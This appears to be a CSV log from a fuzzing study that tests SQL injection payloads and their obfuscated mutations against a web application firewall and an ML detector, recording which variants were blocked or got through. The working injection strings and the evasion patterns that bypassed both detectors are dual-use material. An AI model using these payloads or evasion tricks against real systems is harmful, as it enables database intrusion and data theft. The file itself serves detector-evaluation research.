Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
11,2024-12-16T18:31:51.876611,1%' and   (  3020  =  3020  )  *6703 and '%'  =  ',403,403,200,waf_correct_ml_incorrect,5629<>5630%' and   ( /**/3020  =   OR 0  )  *(SELECT 6703) and '%'  =	 ',2024-12-16T18:31:54.269991,403,403,both_correct," && 1<>5630%' and   (  0xbcc  =   OR 9058=9058  )  *(SELECT 6703) and '%'  =
 '",2024-12-16T18:31:58.698123,403,403,both_correct, && (SELect 1)<>1409 LikE 1409%' and   (  0xbcc /**/=   OR 9058=9058  )  *(SELECT (SELECT 6703)) and '%'  =  ',2024-12-16T18:32:03.619874,403,403,both_correct,	 and  (sElecT 0x1)<>1660<> AND 1 LIke 1409%' and   (  0xbcc /**/=   OR 9058=9058  )  *(SELECT (SELECT 6703))/**/and '%'  =  ',2024-12-16T18:32:09.957081,403,403,both_correct,  ANd  (selEcT 0x1)<>'JPm' not like 'JPmc'<> ANd 1 lIKE (SELECT 1409)%' and   (  0xbcc /**/=   OR 9058=9058  )  *(SELECT (SELECT  AND 1)) and '%'  =  ',2024-12-16T18:32:16.785819,200,403,waf_incorrect_ml_correct
12,2024-12-16T18:32:24.752340,"1,  (  select 9100  =    (  'qqpjq'||  (  select case 9100 when 9100 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   ",403,403,403,both_correct,"1,  (  seLEcT 9100   like     (  'qqpjq'||  (  sElecT CAsE 9100 WHen/**/(SELECT 9739 LIKE 9739) Then	0x1 ELsE 0 ENd FROm rdb$database  )  ||'qzvzq'   )    )   ",2024-12-16T18:32:31.046130,403,403,both_correct,"5532<>(sELECT 1),  (  SeLECt 9100   LiKE     (  'qqpjq' OR   (  SeLeCT CAsE 9100 whEn (sELecT 9739 LIKE 0x260b) THeN 0x1 ELSE 0 eNd FrOm rdb$database  )  ||'qzvzq'   )    )   ",2024-12-16T18:32:39.401068,403,403,both_correct,"5532<>(sELeCt 0x1),  (  SElEct '2'<>'2]'   LIKE/**/    (  'qqpjq' or   (  SeLeCT Case 9100 wHEN (seLecT 9739
lIKe 0x260b) ThEN 0x1 ELSE  OR 0 EnD FroM rdb$database  )  ||'qzvzq'   )    )   ",2024-12-16T18:32:48.589815,403,200,waf_correct_ml_incorrect,"0x159c!=(seLeCT 0x1),  (  SELEct '(SELECT '\e_'!='\e_3')'<>'2]'   lIKE/**/    (  'qqpjq' OR   (  seLEct CasE 9100 wHEN (SeLECT 9739	Like 0x260b) THen 0x1 Else  Or 0 eND fRom rdb$database  )/**/ ||'qzvzq'   )    )   ",2024-12-16T18:32:58.735068,403,200,waf_correct_ml_incorrect,"0x159c NOT LIKE (sElEct 0x1),  (  SELECt '(SELECT '\e_'!='\e_3')'<>'(SELECT 2)]'   likE     (  'qqpjq' or   (  seLEcT CaSe  OR 0 WHEN (SEleCT 9739 LikE 0x260b) ThEN 0x1 elSE  OR 9848<>9849 end froM rdb$database  )/*8AEb%*/ ||'qzvzq'   )    )   ",2024-12-16T18:33:09.617746,403,403,both_correct
13,2024-12-16T18:33:22.216555,"1""   )    )    as vbdo where 3882  =  3882",403,403,200,waf_correct_ml_incorrect,"'/L'!='/LC'""   )    )  /**/ As vbdo wHErE (SELeCT 3882)  	lIke    Or 0",2024-12-16T18:33:24.361238,403,200,waf_correct_ml_incorrect,"'/L'!='/LC'""  	)    )    As vbdo WHerE (seLecT 3882)  	LiKE    Or 0x24cd LIKE  && 1",2024-12-16T18:33:28.787379,403,200,waf_correct_ml_incorrect,"'/L'!='/LC'""  
)    )    aS vbdo WHErE (sELecT (SELECT 1))/**/ 	liKE    Or 0x24cd liKE  && (SelECT '
PxK' LiKe '
PxK')",2024-12-16T18:33:33.756572,403,403,both_correct,"'/L'!='/LC'""  
)    )    AS vbdo WhERe (selECt (SelEcT 7872 in ( and 1,0x1ec0,7873)))  
lIKe    or 0x24cd liKE  && (SELeCT '
PxK' LikE '
PxK')",2024-12-16T18:33:40.329732,403,403,both_correct,"'/L'/**/not like '/LC'""  
)    )    AS vbdo whErE (SeLEcT (SeLeCT 7238!=(SeLECt 7239) In ( And 1,0x1ec0,(SeLECt 1))))  
LIke   	oR 0x24cd LIke  && (sELect '
PxK' LiKE '
PxK')",2024-12-16T18:33:48.240351,403,403,both_correct
14,2024-12-16T18:33:57.422264,73107657h,200,200,200,both_correct,73107657h,2024-12-16T18:33:57.975545,200,200,both_correct,73107657h,2024-12-16T18:33:59.527625,200,200,both_correct,73107657h,2024-12-16T18:34:01.065055,200,200,both_correct,73107657h,2024-12-16T18:34:02.592514,200,200,both_correct,73107657h,2024-12-16T18:34:04.142583,200,200,both_correct
15,2024-12-16T18:34:05.687840,"-7743"" or 9323  =  9323#",403,403,200,waf_correct_ml_incorrect,"-(SElEcT (SELECT 1))""/**/Or 9323 	 like   3290 LIKE 3290#vz",2024-12-16T18:34:06.917664,403,403,both_correct,"-(SELEct (SEleCT (SELECT 1) NOT LIKE 0x14ba))""/**/OR 9323 
 LIke/**/  3290 LIke 3290#vzy<",2024-12-16T18:34:10.727711,403,403,both_correct,"-(SELECT (SElect (SElECt 'e=' LIKE 'e=') NOT LIKE 0x14ba))"" OR (SELECT 1) 
 lIke/**/  3290
Like 0xcda#vzy<",2024-12-16T18:34:15.921756,403,403,both_correct,"-(SElect (SelEct (SeLEct 'e=' lIKE 'e=')/**/NOT LIKE 0x14ba))"" OR (SElECt (SEleCT 1)) 
 LIkE/*?v+,1*/  979 iN (978,979, OR 0)	lIKe 0xcda#vzy<",2024-12-16T18:34:22.205759,403,200,waf_correct_ml_incorrect,"-(SeLEct (sELECt (SeLeCT 'e=' LIkE/**/'e=')/**/not like 0x14ba))"" OR (sElEct (SElECt (SELECT 1))) 
 LIkE/*?v+,1*/ 
 ANd 1 IN (978,979, Or 'E' NOT LIKE 'Ed')	lIke 0xcda#vzy<h",2024-12-16T18:34:29.895683,403,403,both_correct
16,2024-12-16T18:34:39.034146," select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",403,403,403,both_correct," SElECT * FRoM users Where id   like  
/**/OR 'Lg!c''<>'Lg!c'4' oR \<\. union sELecT 0x1,@@VERSION -- 1?",2024-12-16T18:34:42.514239,403,403,both_correct," sELeCT * FrOm users WhERe id   liKe  	 oR 'Lg!c''<>'Lg!c'(SELECT  OR 0)' or \<\. union SElect 0x1,@@VERSION -- '/`' LIKE '/`'?{8",2024-12-16T18:34:48.653790,403,403,both_correct," SELEcT * From users/*)*/wheRe id   lIkE  	
Or 'Lg!c''<>'Lg!c'(SELECT  OR 6832 LIKE 6832)' or \<\. union SEleCt 0x1,@@VERSION -- '/`' LIKE '/`'?{(SELECT (SELECT 1))",2024-12-16T18:34:55.588264,403,403,both_correct," seLect * fRom users/*)*/WhEre id   LikE   
or 'Lg!c''<>'Lg!c'(SELECT  OR 6832 LIKE '-'<>'-X')' oR \<\. union SElecT 0x1,@@VERSION -- '/`'/**/LIKE '/`'?{(SELECT (SELECT (SELECT (SELECT 1))))",2024-12-16T18:35:04.295620,403,403,both_correct," SELeCt * FrOM users/*)*/wherE id   LikE    or 'Lg!c''<>'Lg!c'(SELECT  OR  AND 'k'<>'kC' LIKE '-'<>'-X')' or \<\./**/union SeLeCt 0x1,@@VERSION -- '/`'/**/LIKE '/`'?{(SELECT (SELECT (SELECT (SELECT 0x1))))Ta",2024-12-16T18:35:14.409912,403,403,both_correct
17,2024-12-16T18:35:24.994768,"1"" and 7533  =  7533",403,403,200,waf_correct_ml_incorrect,"0x10cb!=4300"" anD 7533/**/	 LIKE    OR 0",2024-12-16T18:35:26.050233,200,200,both_incorrect,"0x10cb!= anD 1"" AND 0x1d6d/**/
 lIkE /**/  OR '`' lIKe '`'",2024-12-16T18:35:28.992031,200,200,both_incorrect,"0x10cb!=	AnD  AND 3990!=0xf97"" aND/**/0x1d6d/*Tez*/
 LIKE /**/  oR '`' like '`'",2024-12-16T18:35:32.815212,200,200,both_incorrect,"0x10cb not like 	aND  And 0xf96!=0xf97"" ANd/**/0x1d6d/*^9d	*/
	LiKE /**/  oR '`'/**/LIkE '`'",2024-12-16T18:35:37.629820,200,200,both_incorrect,"0x10cb not like 	aND /**/ANd 0xf96!=0xf97"" and/**/0x1d6d/*^9d	*/ 	LiKE /**/  || '`'/**/lIKE '`'",2024-12-16T18:35:43.287330,200,200,both_incorrect
18,2024-12-16T18:35:48.789345,milly7,200,200,200,both_correct,milly7,2024-12-16T18:35:49.203248,200,200,both_correct,milly7,2024-12-16T18:35:50.583257,200,200,both_correct,milly7,2024-12-16T18:35:52.010275,200,200,both_correct,milly7,2024-12-16T18:35:53.425073,200,200,both_correct,milly7,2024-12-16T18:35:54.840316,200,200,both_correct
19,2024-12-16T18:35:56.248017,jose cadalso s/n 7d,200,200,200,both_correct,jose/**/cadalso s/n	7d,2024-12-16T18:35:57.254405,200,200,both_correct,jose cadalso	s/n	7d,2024-12-16T18:35:59.392406,200,200,both_correct,jose/**/cadalso	s/n 7d,2024-12-16T18:36:01.393821,200,200,both_correct,"jose/*$)yru*/cadalso
s/n/**/7d",2024-12-16T18:36:03.569977,200,200,both_correct,jose/*$)yru*/cadalso	s/n 7d,2024-12-16T18:36:06.113891,200,200,both_correct
20,2024-12-16T18:36:08.470956,-8187'   )    )     )   or 1698  =  2823#,403,403,200,waf_correct_ml_incorrect,"-0x1ffb' /**/ )	   )     )   Or 9654 IN (9653,9654,9655)   LIKe   (SEleCt 1)#@;",2024-12-16T18:36:10.517748,403,403,both_correct,"-0x1ffb' /*#O;*/ )	  /**/)     )   or  OR
3553=3553 In ((seLECt 9653),9654,9655)   LIke   (SELeCt 1)#@;",2024-12-16T18:36:15.545965,403,403,both_correct,"-0x1ffb' /**/ )	 /**//*B;	N^*/)     )   OR  Or 3553 LIKE 7992 liKe 7992 in ((SELECt 9653), AND (SELECT 1),9655)   lIKe   (select 1)#@;",2024-12-16T18:36:21.528659,403,403,both_correct,"-0x1ffb'   )	 /*j*//*B;
N^*/)     )   ||  OR 1176!=(sElecT 1177) LiKE 7992 LIKE 7992 IN ((seLECT 9653), and (SELEct 1), AND 1)   Like   (SELeCT 1)#@;",2024-12-16T18:36:28.911608,403,200,waf_correct_ml_incorrect,"-0x1ffb'   )
  /*B;
N^*/)     )    OR   oR 1176!=(SElecT 1177) likE  aNd 1 like 2112 IN (2111,2112,2113) In ((SeLect (SELECT 9653)), ANd (sELeCT 1), anD 1)   lIKE   (SelecT 1)#@;N",2024-12-16T18:36:36.940126,403,403,both_correct
21,2024-12-16T18:36:46.717559,"1'   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'ewwi'  =  'ewwi",403,403,200,waf_correct_ml_incorrect,"(seLect  OR 0)'   )    ) 	   )   or 'B[' LIKE 'B['  =/**/   (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'ewwi'  =  'ewwi",2024-12-16T18:36:54.724176,403,200,waf_correct_ml_incorrect,"(selECt  OR  OR 't'!='te')'   )    ) 	   )   or 'B[' LIKE
'B['  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'ewwi'  =  'ewwi",2024-12-16T18:37:04.860532,403,200,waf_correct_ml_incorrect,"(sELEct  or  OR 't' not like 'te')'   )    )     )   or 'B[' LIKE
'B['  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (   /**/(     (  'ewwi'  =  'ewwi",2024-12-16T18:37:15.911472,403,403,both_correct,"(SeLeCt  OR  Or 't' not like 'te')'   )    )     )   or 'B[' LIKE	'B['  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  'ewwi'  =  'ewwi",2024-12-16T18:37:27.101702,403,403,both_correct,"(SElEct  oR  OR 't' not like 'te')'   )    )     )   or 'B[' LIKE	'B['  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    ( 	   (  'ewwi'  = /*""*/'ewwi",2024-12-16T18:37:38.487790,403,403,both_correct
22,2024-12-16T18:37:49.761950,389,200,200,200,both_correct,(SelEcT/**/0x1),2024-12-16T18:37:50.040813,403,200,waf_incorrect_ml_correct,(seLECt 0x1),2024-12-16T18:37:51.863063,403,200,waf_incorrect_ml_correct,"(SeLeCt
0x1)",2024-12-16T18:37:53.567885,403,403,both_incorrect,(SeLeCt 0x1),2024-12-16T18:37:55.257682,403,403,both_incorrect,(SelECt	0x1),2024-12-16T18:37:56.948915,403,403,both_incorrect
23,2024-12-16T18:37:58.645317,"-2190'  )   where 8890  =  8890 union all select 8890,8890#",403,403,403,both_correct,"-2190' 
)   WhEre 8890 /**/ LIKE    AND 1 union all SeLECt '5'!='5G',0x22ba#",2024-12-16T18:38:01.706671,403,403,both_correct,"- AND 1 liKe 2296'  )   WhEre 8890   LIKE    AND 0x1 union all SeLECt '5'!='5G',0x22ba#",2024-12-16T18:38:06.425679,403,403,both_correct,"-/**/&& 'KB' NOT LIKE 'KBj' Like (SELECt 1)'  )   WhEre 8890   LIKE    AND 0x1
union all SeLECt '(SELECT 5)'!='5G',0x22ba#t",2024-12-16T18:38:11.647645,403,403,both_correct,"-/**/&& 'KB' NOT LIKE/**/'KBj' lIke (sELECt 1)'  )   WhEre 'Fa' NOT LIKE 'Fa,'   LIKE    AND 0x1	union all SeLECt '(sElEcT (SELECT  and 1))'!='5G',0x22ba#tHr",2024-12-16T18:38:18.509657,403,403,both_correct,"-/**/&& 'KB' not like/**/'KBj' lIKE (seLecT  AND 4819 LIKE 4819)'  )   WhEre 'Fa' NOT LIKE 'Fa,'  	LIKE    AND 0x1	union all SeLECt '(seLECt (SeLeCt /**/AND (SELECT 1)))'!='5G',0x22ba#tHr.",2024-12-16T18:38:26.893641,403,403,both_correct
24,2024-12-16T18:38:36.898990,"1""  )   where 3826  =  3826",403,200,200,both_incorrect,"1""  )	 /**/whEre (SELECT 3141)!= || 0  =  3826",2024-12-16T18:38:38.244978,200,403,waf_incorrect_ml_correct,"0x1""  )
  wHerE (SeLECt 3141)!= ||  && 1=7600  =  3826",2024-12-16T18:38:41.433322,200,200,both_incorrect,"0x1""  )
  wHERE (SeLect (SELECT '^ ' NOT LIKE '^ e'))!= || 
&& 1/**/like 7600  =  0xef2",2024-12-16T18:38:45.073639,403,403,both_correct,"0x1""  )
  whErE (SeLecT (selECT '^ ' NOT LIKE '^ e'))!=  OR  
&&
(SELECT 8991) LIke 8991 LiKe  OR 0  =  0xef2",2024-12-16T18:38:50.259649,403,403,both_correct,"0x1""  )   WHerE (SeleCt (selEcT/**/'^ ' NOT LIKE '^ e'))!=  oR  
&&
(seLeCT 4826!=(SELECT 1)) LIkE 0x231f like  OR 0   like   0xef2",2024-12-16T18:38:56.659083,403,403,both_correct
25,2024-12-16T18:39:03.911506,ubaldino,200,200,200,both_correct,ubaldino,2024-12-16T18:39:04.419958,200,200,both_correct,ubaldino,2024-12-16T18:39:05.899780,200,200,both_correct,ubaldino,2024-12-16T18:39:07.371248,200,200,both_correct,ubaldino,2024-12-16T18:39:08.892976,200,200,both_correct,ubaldino,2024-12-16T18:39:10.429587,200,200,both_correct
